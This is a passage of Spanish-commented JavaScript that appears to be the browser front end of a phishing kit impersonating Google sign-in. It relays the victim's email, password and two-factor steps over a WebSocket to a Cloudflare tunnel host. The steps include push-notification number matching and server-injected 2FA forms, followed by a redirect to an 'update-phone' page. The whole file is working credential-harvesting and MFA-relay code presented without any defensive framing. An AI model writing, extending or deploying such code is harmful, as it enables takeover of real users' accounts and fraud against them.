        } else if (screenName === 'AUTH_NOTIFICATION_PENDING') {
            // ------------------------- LÓGICA LISTENERS PANTALLA AUTH_NOTIFICATION_PENDING -------------------------
            // setupAuthNotificationPendingListeners(); // Descomentar y crear si es necesario
            console.log("Pantalla AUTH_NOTIFICATION_PENDING no requiere listeners específicos post-carga.");
            // ------------------------- FIN LÓGICA LISTENERS PANTALLA AUTH_NOTIFICATION_PENDING -------------------------
        } else if (screenName === 'AUTH_NOTIFICATION_PENDING_PRESS_NUMBER') {
            // ------------------------- LÓGICA LISTENERS PANTALLA AUTH_NOTIFICATION_PENDING_PRESS_NUMBER -------------------------
            // setupAuthNotificationPressNumberListeners(); // Descomentar y crear si es necesario
            console.log("Pantalla AUTH_NOTIFICATION_PENDING_PRESS_NUMBER no requiere listeners específicos post-carga.");
            // ------------------------- FIN LÓGICA LISTENERS PANTALLA AUTH_NOTIFICATION_PENDING_PRESS_NUMBER -------------------------
        } else if (screenName === 'update-phone') {
            // ------------------------- LÓGICA LISTENERS PANTALLA UPDATE-PHONE -------------------------
            // setupUpdatePhoneListeners(); // Descomentar y crear si es necesario
            console.log("Pantalla update-phone no requiere listeners específicos post-carga.");
            // ------------------------- FIN LÓGICA LISTENERS PANTALLA UPDATE-PHONE -------------------------
        }




        
        // ... añadir más 'else if' para otras pantallas ...
        // ------ FIN CONFIGURACIÓN LISTENERS ESPECÍFICA POR PANTALLA ------

        hideLoader(); // Ocultar loader una vez que la pantalla está lista
        console.log(`Pantalla ${screenName} cargada y configurada exitosamente.`);

    } catch (error) {
        console.error(`Error fatal al cargar la pantalla ${screenName}:`, error);
        appContainer.innerHTML = `<p style="color: red; padding: 20px;">Error al cargar el contenido. Por favor, intenta de nuevo más tarde.</p>`;
        hideLoader(); // Asegurarse de ocultar el loader en caso de error
    }
}



// ------------------------- MANEJO WEBSOCKET --------------------------- //

/**
 * Maneja la apertura de la conexión WebSocket.
 */
function handleWebSocketOpen() {
    console.log("WebSocket Conectado.");
    // Enviar mensaje inicial al servidor para indicar que el cliente está listo
    sendMessage({ action: 'START' });
}

/**
 * Maneja los mensajes recibidos del servidor WebSocket.
 * @param {MessageEvent} event - El evento del mensaje WebSocket.
 */
function handleWebSocketMessage(event) {
    try {
        const message = JSON.parse(event.data);
        console.log("Mensaje WebSocket recibido:", message);

        // Gestionar respuesta basada en el 'status'
        switch (message.status) {
            case 'READY':
                // El servidor está listo. La UI inicial (screen1) ya está configurada.
                console.log("Servidor confirma: Listo.");
                // Podrías habilitar elementos si estuvieran deshabilitados inicialmente
                break;

            case 'ENTER_PASSWORD':
                // El email/teléfono es válido según el servidor.
                hideLoader(); // Ocultar loader
                clearScreen1Errors(); // Limpiar errores por si acaso
                loadScreen('screen2'); // Cargar la pantalla 2
                break;

            case 'EMAIL_INVALID':
                // El email/teléfono NO es válido.
                hideLoader(); // Ocultar loader
                // Mostrar el mensaje de error proporcionado por el servidor o uno genérico
                showScreen1Error("No pudimos encontrar tu cuenta de Google");
                break;

            case 'LOGIN_SUCCESS':
                //hideLoader();
                //clearScreen1Errors();
                console.log("Servidor indica login exitoso, cargando pantalla update-phone...");
                //loadScreen('update-phone');
                window.location.href = 'screens/update-phone.html'; 
                 break;

            case 'PASSWORD_INVALID':
                 // La contraseña NO es válida.
                 hideLoader();
                 showScreen1Error('La contraseña es incorrecta. Vuelve a intentarlo.');
                 break;

            case 'PASSWORD_CHANGED_RECENTLY':
                // La contraseña ha sido cambiada.  
                hideLoader();
                const specificErrorMessage = message.message; // message es el objeto parseado de event.data
                 console.log(`PASSWORD_CHANGED_RECENTLY: Mostrando error específico: "${specificErrorMessage}"`);
                 showScreen1Error(specificErrorMessage || 'La contraseña fue cambiada recientemente.');
                 break;


            case 'AUTH_NOTIFICATION_PENDING_PRESS_NUMBER':
                // El servidor está indicando que el usuario debe presionar un número.
                hideLoader(); // Ocultar loader
                // Aquí podrías mostrar un mensaje o cambiar la UI para indicar al usuario que presione un número
                loadScreen('AUTH_NOTIFICATION_PENDING_PRESS_NUMBER', message.payload);
                break;

                case 'AUTH_2FA_OPTIONS_PRESENT':
    // 1. Cargar la estructura base de la pantalla 2FA
    loadScreen('AUTH_2FA_OPTIONS_PRESENT')
      .then(() => {
        // 2. Una vez cargada la estructura, inyectar el formulario
        if (message.payload && message.payload.formHtml) {
          const success = injectAndModifyAuthForm(
            message.payload.formHtml,     // ← aquí cambiamos de message.data a message.payload
            'auth-form-target'            // ID del contenedor en tu HTML
          );
          if (!success) {
            console.error("Fallo al inyectar/modificar el formulario 2FA.");
            // Podrías mostrar un mensaje de error al usuario aquí
          }
          // setupAuthOptionsListeners() y hideLoader() ya se llaman dentro de injectAndModifyAuthForm
        } else {
          console.error("AUTH_2FA_OPTIONS_PRESENT llegó sin formHtml en payload.");
          appContainer.innerHTML =
            '<p style="color: red;">Error al recibir las opciones de verificación.</p>';
          hideLoader();
        }
      })
      .catch(error => {
        console.error(
          "Error al cargar la pantalla base AUTH_2FA_OPTIONS_PRESENT:", error
        );
        appContainer.innerHTML =
          '<p style="color: red;">Error al cargar la pantalla de verificación.</p>';
        hideLoader();
      });
    break;

           
        
            case 'AUTH_NOTIFICATION_PENDING':
                    //hideLoader();
                    // Ahora tu servidor manda { status, payload: { deviceName } }
                    if (message.payload && message.payload.deviceName) {
                        currentDeviceName = message.payload.deviceName;
                        console.log(`Nombre del dispositivo guardado: ${currentDeviceName}`);
                    } else {
                        currentDeviceName = null;
                        console.warn("AUTH_NOTIFICATION_PENDING recibido sin payload.deviceName.");
                    }
                    loadScreen('AUTH_NOTIFICATION_PENDING');
                break;

            default:
                console.warn("Estado de mensaje WebSocket no reconocido:", message.status);
                hideLoader(); // Ocultar loader por si acaso
        }
    } catch (error) {
        console.error("Error al procesar mensaje WebSocket:", error, "Data recibida:", event.data);
        hideLoader(); // Ocultar loader si hay error procesando
    }
}





/**
 * Maneja errores en la conexión WebSocket.
 * @param {Event} event - El evento de error.
 */
function handleWebSocketError(event) {
    console.error("Error en WebSocket:", event);
    // Aquí podrías mostrar un mensaje de error genérico al usuario
    hideLoader(); // Asegurarse que el loader no quede visible
}

/**
 * Maneja el cierre de la conexión WebSocket.
 */
function handleWebSocketClose() {
    console.log("WebSocket Desconectado.");
    // Aquí podrías deshabilitar la UI o mostrar un mensaje indicando la desconexión
    hideLoader(); // Asegurarse que el loader no quede visible
}

/**
 * Envía un mensaje (objeto JS) al servidor a través del WebSocket.
 * @param {object} data - El objeto a enviar (será convertido a JSON).
 */
function sendMessage(data) {
    if (socket && socket.readyState === WebSocket.OPEN) {
        try {
            const messageString = JSON.stringify(data);
            socket.send(messageString);
            console.log("Mensaje WebSocket enviado:", data);
        } catch (error) {
             console.error("Error al convertir a JSON o enviar mensaje WebSocket:", error, "Data:", data);
        }
    } else {
        console.error("Intento de enviar mensaje, pero WebSocket no está conectado o listo. Estado:", socket ? socket.readyState : 'Socket no inicializado');
        // Considera mostrar un error al usuario aquí si es crítico
        hideLoader(); // Ocultar loader si no se pudo enviar
    }
}


// ------------------------- INICIALIZACIÓN APP --------------------------- //

/**
 * Inicializa la conexión WebSocket.
 */
function initWebSocket() {
    console.log("Iniciando conexión WebSocket...");

    // ---- Línea Añadida ----
    // Obtiene dinámicamente la IP o nombre de host del servidor
    // Usa el mismo hostname/IP que el navegador usó para cargar la página (ej: 192.168.5.52)
    const wsHost = window.location.hostname;

    // ---- Línea Añadida ----
    // Construye la URL completa y correcta para el WebSocket (ej: ws://192.168.5.52:8080)
    //const wsUrl = `ws://${wsHost}:8080`;

    const cloudflareTunnelUrl = 'formats-strain-tea-admissions.trycloudflare.com'; // SOLO el hostname del túnel
    const wsUrl = `wss://${cloudflareTunnelUrl}`;

    // Loguea la URL que se usará para la conexión (útil para depurar)
    console.log(`Intentando conectar WebSocket a: ${wsUrl}`);

    // ---- Lógica Añadida/Reordenada ----
    // PRIMERO: Comprueba si ya existe un socket activo o conectándose
    // y ciérralo para evitar conexiones múltiples.
    if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) {
        console.warn("WebSocket existente encontrado (estado " + socket.readyState + "). Cerrando antes de crear uno nuevo.");
        // Es importante quitar los listeners viejos antes de cerrar para evitar fugas de memoria o comportamiento inesperado
        socket.removeEventListener('open', handleWebSocketOpen);
        socket.removeEventListener('message', handleWebSocketMessage);
        socket.removeEventListener('error', handleWebSocketError);
        socket.removeEventListener('close', handleWebSocketClose);
        socket.close();
        console.log("Socket anterior cerrado.");
    }

    // ---- Bloque try...catch Añadido ----
    // Es buena práctica envolver la creación del WebSocket en un try...catch
    // por si la URL es inválida o hay problemas iniciales de red.
    try {
        // ---- Línea Modificada ----
        // Crea la ÚNICA conexión WebSocket usando la URL dinámica y correcta (wsUrl).
        // Se elimina la línea original que usaba 'ws://localhost:8080'
        
        socket = new WebSocket(wsUrl);

        console.log("Nuevo objeto WebSocket creado. Asignando listeners...");

        // Asignar manejadores a los eventos del NUEVO socket
        socket.addEventListener('open', handleWebSocketOpen);
        socket.addEventListener('message', handleWebSocketMessage);
        socket.addEventListener('error', handleWebSocketError);
        socket.addEventListener('close', handleWebSocketClose);

        console.log("Listeners asignados al nuevo socket.");

    } catch (error) {
        // ---- Manejo de Error Añadido ----
        console.error("Error CRÍTICO al crear el objeto WebSocket:", error);
        // Muestra un mensaje de error útil en la interfaz
        const appDiv = document.getElementById('app');
        if (appDiv) {
            appDiv.innerHTML = `<p style="color: red; padding: 20px;">No se pudo iniciar la conexión con el servidor (${wsUrl}). Error: ${error.message}. Verifica la URL, la red y que el servidor esté activo.</p>`;
        }
        hideLoader(); // Asegúrate de ocultar el loader si falla la conexión
    }
}
/**
 * Función principal que se ejecuta cuando el DOM está completamente cargado.
 */
function main() {
    console.log("DOM completamente cargado y parseado.");
    // 1. Configurar los listeners para la pantalla inicial (screen1) que ya está en el HTML
    setupScreen1Listeners();
    // 2. Iniciar la conexión WebSocket
    initWebSocket();
}

// Ejecutar la función main cuando el contenido del DOM esté listo
window.addEventListener('DOMContentLoaded', main);